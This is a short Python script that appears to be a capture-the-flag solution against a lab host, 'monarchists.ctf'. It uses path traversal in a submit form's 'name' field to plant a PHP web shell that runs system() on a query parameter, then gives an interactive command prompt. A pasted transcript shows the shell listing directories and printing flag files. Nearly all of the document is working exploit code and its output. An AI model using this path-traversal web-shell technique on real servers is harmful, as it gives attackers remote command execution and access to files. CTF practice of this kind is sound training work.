#!/usr/bin/env python
import requests

s = requests.session()

r = s.get('http://monarchists.ctf/submit.php', params={
    'name': '../../../../../../../proc/self/cwd/eval.php',
    'message': '''
<?php
system($_GET["cmd"]);
?>
'''})

while True:
    cmd = raw_input("php$ ")
    r = s.get('http://monarchists.ctf/eval.php', params={'cmd': cmd})
    print r.text

'''
php$ ls -l ../
From: ../../../../../../../proc/self/cwd/eval.php


total 15
drwxrwxr-- 2 root     www-data 71 May 21 13:49 data
-rw-r--r-- 1 www-data www-data 65 Apr 28 21:58 flag
-rw-r--r-- 1 www-data root     44 May  5 12:18 flag-uxhUriy7FGoFHjNAqn4CgO4EREHRddFA4d3gbI
drwxrwxr-x 2 root     www-data 21 May 21 14:04 www

php$ cat ../flag
From: ../../../../../../../proc/self/cwd/eval.php


flag-fjIHNidoVduVl9YIortaQl7KU3cR0g9HDGY84k9T8jQZi3uWxVBlTtWmMvg

php$ cat ../flag-uxhUriy7FGoFHjNAqn4CgO4EREHRddFA4d3gbI
From: ../../../../../../../proc/self/cwd/eval.php


flag-uxhUriy7FGoFHjNAqn4CgO4EREHRddFA4d3gbI
'''
